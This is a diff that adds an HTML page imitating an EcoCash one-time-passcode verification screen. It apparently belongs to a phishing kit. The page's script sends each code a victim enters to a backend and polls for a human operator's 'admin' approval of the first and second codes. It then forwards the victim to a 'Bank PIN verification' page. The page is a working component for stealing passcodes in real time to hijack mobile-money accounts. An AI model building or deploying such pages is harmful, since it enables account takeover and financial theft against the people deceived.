@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Header Styles */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eaeaea;
+            background: #fff;
+        }
+
+        .back-arrow {
+            font-size: 20px;
+            text-decoration: none;
+            color: #666;
+            cursor: pointer;
+            width: 30px;
+        }
+
+        .logo {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333333;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            width: 30px;
+            align-items: flex-end;
+        }
+
+        .menu-icon div {
+            width: 22px;
+            height: 2px;
+            background-color: #333;
+        }
+
+        /* Container & Card */
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+            z-index: 1;
+        }
+
+        .card {
+            background: #ffffff;
+            border: 1px solid #f0f0f0;
+            border-radius: 16px;
+            padding: 30px 24px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
+        }
+
+        .card h2 {
+            color: #1a65cc;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .card p {
+            color: #666666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .phone-display {
+            display: inline-block;
+            font-weight: 700;
+            color: #000000;
+            font-size: 15px;
+        }
+
+        /* 6-Digit Box Styling */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .otp-box {
+            width: 50px;
+            height: 54px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            border: 1px solid #d2d6dc;
+            border-radius: 8px;
+            background-color: #f9fafb;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .otp-box:focus {
+            border-color: #1a65cc;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(26, 101, 204, 0.15);
+        }
+
+        /* Verify Button */
+        .btn-verify {
+            width: 100%;
+            background-color: #1a65cc;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .btn-verify:hover {
+            background-color: #1452a8;
+        }
+
+        .btn-verify:disabled {
+            background-color: #a0aec0;
+            cursor: not-allowed;
+        }
+
+        /* Timer and Resend section */
+        .timer-container {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #1a65cc;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: underline;
+        }
+
+        .resend-btn:disabled {
+            color: #a0aec0;
+            text-decoration: none;
+            cursor: not-allowed;
+        }
+
+        /* Full Screen Loading Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .loading-content {
+            text-align: center;
+            padding: 20px;
+            max-width: 340px;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, #007bc4 0%, #014d8c 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            box-shadow: 0 8px 20px rgba(1, 77, 140, 0.2);
+        }
+
+        .spinner::after {
+            content: '';
+            width: 56px;
+            height: 56px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid #ff6f00;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay h3 {
+            color: #014d8c;
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .overlay p {
+            color: #555;
+            font-size: 14px;
+        }
+
+        /* Bottom Curved Decoration element */
+        .bottom-curve {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background-color: #0066ff;
+            border-top-left-radius: 50% 100%;
+            border-top-right-radius: 50% 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @media (max-width: 400px) {
+            .otp-box {
+                width: 42px;
+                height: 48px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header navigation section -->
+    <header>
+        <a class="back-arrow" onclick="window.history.back()">&#8592;</a>
+        <div class="logo">OTP Verification</div>
+        <div class="menu-icon">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </header>
+
+    <!-- Main Entry Container -->
+    <div class="container">
+        <div class="card">
+            <h2>OTP Verification</h2>
+            <p>Enter the 6-digit code sent to your phone number <span id="phoneTarget" class="phone-display">+263771268100</span></p>
+
+            <!-- Box input block for dynamic code input -->
+            <div class="otp-container">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            </div>
+
+            <!-- Action triggering Verify Button replacement -->
+            <button id="verifyButton" class="btn-verify" onclick="sendVerificationData()">Verify</button>
+
+            <!-- Timer elements -->
+            <div class="timer-container">
+                <span id="timerText">Resend code in <strong id="countdown">02:00</strong></span>
+                <button id="resendButton" class="resend-btn" onclick="triggerResend()" style="display: none;">Resend code</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fullscreen Loading Overlay Portal -->
+    <div id="loadingOverlay" class="overlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h3 id="overlay-title">Please wait...</h3>
+            <p id="overlay-text">We are verifying your OTP code with EcoCash systems.</p>
+        </div>
+    </div>
+
+    <!-- Design element layout -->
+    <div class="bottom-curve"></div>
+
+    <script>
+        let pollingInterval = null;
+        let globalPhone = "";
+        let isSecondOtp = false; // Flag to check if this instance is running a step 2 request
+
+        // --- FETCHING PREVIOUS NUMBER DYNAMICALLY ---
+        window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const phoneParam = urlParams.get('phone');
+            const stepParam = urlParams.get('step'); // Optional check if your redirect specifies step=2
+            const storedPhone = localStorage.getItem('user_phone_number') || localStorage.getItem('phone');
+            
+            if (phoneParam) {
+                globalPhone = phoneParam;
+            } else if (storedPhone) {
+                globalPhone = storedPhone;
+            } else {
+                globalPhone = "263771268100"; // fallback default
+            }
+
+            // Check if page needs to execute second OTP flow configuration
+            if (stepParam === "2" || localStorage.getItem('otp_step') === "2") {
+                isSecondOtp = true;
+                document.getElementById('overlay-text').textContent = "We are verifying your second OTP code with EcoCash systems.";
+            }
+
+            document.getElementById('phoneTarget').textContent = globalPhone.startsWith('+') ? globalPhone : '+' + globalPhone;
+            
+            startCountdown(120); // Initialize 2 minute timer
+            setupOtpNavigation();
+        });
+
+        // --- 6-DIGIT BOX DYNAMIC NAVIGATION LOGIC ---
+        function setupOtpNavigation() {
+            const inputs = document.querySelectorAll('.otp-box');
+            
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        // --- 2 MINUTE COUNTDOWN TIMER SYSTEM ---
+        let timerInterval;
+        function startCountdown(durationSeconds) {
+            clearInterval(timerInterval);
+            const display = document.getElementById('countdown');
+            const timerText = document.getElementById('timerText');
+            const resendBtn = document.getElementById('resendButton');
+
+            timerText.style.display = 'inline';
+            resendBtn.style.display = 'none';
+
+            let timer = durationSeconds;
+            timerInterval = setInterval(() => {
+                let minutes = Math.floor(timer / 60);
+                let seconds = timer % 60;
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(timerInterval);
+                    timerText.style.display = 'none';
+                    resendBtn.style.display = 'inline-block';
+                }
+            }, 1000);
+        }
+
+        async function triggerResend() {
+            try {
+                await fetch("/api/resend-otp-notification", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone: globalPhone, step: isSecondOtp ? "Step 2" : "Step 1" })
+                });
+                alert("A new OTP code has been sent!");
+                startCountdown(120);
+            } catch (err) {
+                console.error("Resend API error:", err);
+            }
+        }
+
+        // --- CHECK STATUS FROM BACKEND SERVER API ---
+        async function checkVerificationStatus() {
+            if (!globalPhone) return;
+
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(globalPhone)}`);
+                const data = await res.json();
+
+                const overlayTitle = document.getElementById('overlay-title');
+                const overlayText = document.getElementById('overlay-text');
+
+                // Logic if admin clicks "Correct" for First OTP (Changes status to "otp1_correct")
+                if (data.status === "otp1_correct") {
+                    clearInterval(pollingInterval);
+                    overlayTitle.textContent = "First Step Approved";
+                    overlayText.textContent = "Loading second authentication code screen...";
+                    
+                    setTimeout(() => {
+                        localStorage.setItem('otp_step', '2');
+                        window.location.reload(); // Reloads page into Step 2 OTP layout mode
+                    }, 2000);
+                }
+
+                // Logic if admin clicks "Correct" for Second OTP (Changes status to "otp2_correct")
+                if (data.status === "otp2_correct") {
+                    clearInterval(pollingInterval);
+                    overlayTitle.textContent = "Success!";
+                    overlayText.textContent = "Verification finalized.";
+                    document.querySelector('.spinner').style.background = '#4CAF50';
+                    
+                    setTimeout(() => {
+                        localStorage.removeItem('otp_step');
+                        window.location.href = "/page9.html"; // Move to Bank PIN verification or dashboard
+                    }, 2000);
+                }
+
+                // Handling Denied/Wrong parameters matching backend memory states
+                if (data.status === "otp1_wrong" || data.status === "otp2_wrong" || data.status === "otp2_wrongpin") {
+                    clearInterval(pollingInterval);
+                    overlayTitle.textContent = "Verification Error";
+                    overlayText.textContent = "Code error. Please re-enter the code correctly.";
+                    
+                    setTimeout(() => {
+                        document.getElementById('loadingOverlay').classList.remove('active');
+                        document.querySelectorAll('.otp-box').forEach(i => i.value = "");
+                    }, 2500);
+                }
+
+            } catch (err) {
+                console.error("❌ Live server polling failed:", err);
+            }
+        }
+
+        // --- SUBMIT DATA TO MATCH YOUR LIVE BACKEND API ---
+        async function sendVerificationData() {
+            const inputs = document.querySelectorAll('.otp-box');
+            let otpCode = "";
+            inputs.forEach(input => otpCode += input.value);
+
+            if (otpCode.length < 6) {
+                alert("Please enter all 6 digits of the verification code.");
+                return;
+            }
+
+            // Show full screen processing overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Dynamically select target matching your express server route layout precisely
+            const targetEndpoint = isSecondOtp ? "/api/verify-second-otp" : "/api/verify-first-otp";
+
+            try {
+                const response = await fetch(targetEndpoint, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone: globalPhone, otp: otpCode })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    console.log("✔️ Live server routing matched and message dispatched.");
+                }
+                
+                // Immediately open up loop queries tracking your status storage array
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
+
+            } catch (err) {
+                console.error("❌ Backend server request error:", err);
+                // Fallback polling loop starter
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
+            }
+        }
+    </script>
+</body>
+</html>
